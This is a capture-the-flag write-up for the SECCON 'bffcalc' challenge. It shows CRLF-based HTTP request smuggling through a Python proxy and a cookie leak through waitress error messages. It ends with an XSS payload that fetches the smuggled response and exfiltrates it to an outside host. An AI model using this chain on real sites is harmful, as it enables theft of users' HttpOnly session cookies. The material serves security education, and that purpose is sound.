# Bffcalc writeup


## Request smuggling via crlf injection

As we can see, bff service just a proxy for backend service.
Let's check bff service sources:

```python
def proxy(req) -> str:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("backend", 3000))
    sock.settimeout(1)

    payload = ""
    method = req.method
    path = req.path_info
    if req.query_string:
        path += "?" + req.query_string
    payload += f"{method} {path} HTTP/1.1\r\n"
    for k, v in req.headers.items():
        payload += f"{k}: {v}\r\n"
    payload += "\r\n"

    sock.send(payload.encode())
    time.sleep(.3)
    try:
        data = sock.recv(4096)
        body = data.split(b"\r\n\r\n", 1)[1].decode()
    except (IndexError, TimeoutError) as e:
        print(e)
        body = str(e)
    return body
```

Proxy function doesn't have CRLF injection check on parameters which inputs user.

Cherrypy server has automatic urldecoding of req.path_info parameter.

### HTTP smuggling PoC

Request:
```
GET /api%20HTTP/1.1%0d%0aHost:%20localhost:3000%0d%0a%0d%0aGET%20/  HTTP/1.1
Host: localhost:3000

```
Response:
```
HTTP/1.1 200 OK
Server: nginx/1.23.2
Date: Thu, 17 Nov 2022 18:58:35 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 158
Connection: keep-alive
Via: waitress

42HTTP/1.1 200 OK
Content-Length: 2
Content-Type: text/html;charset=utf-8
Date: Thu, 17 Nov 2022 18:58:35 GMT
Server: CherryPy/18.8.0
Via: waitress

42
```

## Leak header value by cherrypy errors printing

Our main goal - leak Cookie header value. The easiest way - leaking by server error print.
cherrypy server based on waitress uwsgi. 

Let's check uwsgi errors:

```
  if method != method.upper():
            raise ParsingError('Malformed HTTP method "%s"' % str(method, "latin-1"))
```

If server recongnize cookie contents as method - we won.
```
ourflag / HTTP/1.1

```

For regulation of starting smuggled request with incrorect header, we make POST request and just change Content-Length

Request (Direct request)
```
POST /api HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Content-Length: 655

expra= HTTP/1.1
Remote-Addr: 172.27.0.2
Remote-Host: 172.27.0.2
Connection: upgrade
Host: localhost
X-Real-Ip: 172.27.0.1
X-Forwarded-For: 172.27.0.1
X-Forwarded-Proto: http
Content-Length: 0
Sec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"
Accept: */*a=1;expar=1
Accept-Language: a=1;exapr=1
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Origin: http://localhost:3000
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:3000/
Accept-Encoding: gzip, deflate, br
Cookie: flag=SECCON{flag}; aaa=flag

```
For example, for this http request Content-Length is 655
Response
```
HTTP/1.1 200 OK
Content-Length: 2
Content-Type: text/html;charset=utf-8
Date: Thu, 17 Nov 2022 20:46:53 GMT
Server: CherryPy/18.8.0
Via: waitress

42HTTP/1.0 400 Bad Request
Connection: close
Content-Length: 84
Content-Type: text/plain; charset=utf-8
Date: Thu, 17 Nov 2022 20:46:53 GMT
Server: waitress

Bad Request

Malformed HTTP method "flag=SECCON{flag};"

(generated by waitress)
```

### XSS

On / endpoint of bff service we have a client with xss.
To check it just calculate something with `<img src="#" onerror="alert(1)">` 

### Combine all together

```
<img src="#" onerror="fetch('/%20HTTP/1.1%0d%0aHost:%20localhost:3000%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%20I%0d%0a%0d%0aexpr=', { method: 'POST' } }).then(res=>res.text()).then(res=>fetch('http://remote-ip/?res='+window.btoa(unescape(encodeURIComponent(res)))))">
```
where I - Content-Length value (Need to brute)

Replace I to 464 and remote-ip to remote-ip we give flag
`SECCON{i5_1t_p0ssible_tO_s7eal_http_only_cooki3_fr0m_XSS}`
